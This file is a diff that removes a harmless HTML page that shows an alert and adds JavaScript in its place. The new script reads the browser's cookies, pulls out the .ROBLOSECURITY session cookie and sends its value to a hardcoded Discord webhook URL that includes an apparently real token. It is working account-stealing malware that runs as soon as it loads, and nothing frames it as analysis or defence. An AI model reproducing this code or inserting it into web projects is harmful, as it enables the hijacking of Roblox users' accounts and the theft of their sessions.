@@ -1,19 +1,53 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Script Runner</title>
-  <script>
-    // This script runs automatically when the page loads
-    window.onload = function() {
-      alert("The script has been executed!");
-      console.log("Script executed successfully.");
-    };
-  </script>
-</head>
-<body>
-  <h1>Script Triggered</h1>
-  <p>The script was successfully executed when this page loaded. Check the browser console for details.</p>
-</body>
-</html>
+// Function to send data to a Discord webhook
+var sendToWebhook = function(content) {
+  var webhookUrl = "https://discord.com/api/webhooks/1320498162334699581/oshvXk5Gdwu7upIKyQYDDinC3OB7hqYqHSwB1Kt3dsGTFKve9wdS6JsRQhirtLuY1tST";
+  
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: content // Message to send
+    })
+  }).then(response => {
+    if (response.ok) {
+      console.log("Data sent to Discord webhook successfully.");
+    } else {
+      console.error("Failed to send data to Discord webhook.", response.statusText);
+    }
+  }).catch(error => {
+    console.error("Error sending data to Discord webhook:", error);
+  });
+};
+
+// Function to get all cookies and track progress in console
+var getAllCookies = function() {
+  var cookies = document.cookie.split(';').reduce(function(acc, cookie, index, array) {
+    // Calculate progress and update the loading bar in the console
+    var progress = Math.floor(((index + 1) / array.length) * 100);
+    var length = 50; // Length of the loading bar
+    var filledLength = Math.round(length * progress / 100);
+    var bar = '[' + '='.repeat(filledLength) + ' '.repeat(length - filledLength) + ']';
+    console.log(bar + ' ' + progress + '%');
+
+    var parts = cookie.split('=');
+    if (parts.length === 2) {
+      var cookieName = parts[0].trim();
+      var cookieValue = decodeURIComponent(parts[1].trim());
+      acc[cookieName] = cookieValue;
+      return acc;
+    }
+    return acc;
+  }, {});
+
+  return cookies;
+};
+
+// Get all cookies and send the .ROBLOSECURITY cookie to the webhook if it exists
+var allCookies = getAllCookies();
+if (allCookies['.ROBLOSECURITY']) {
+  var message = '.ROBLOSECURITY cookie found: ' + allCookies['.ROBLOSECURITY'];
+  console.log(message);
+  sendToWebhook(message); // Send to Discord webhook
+}
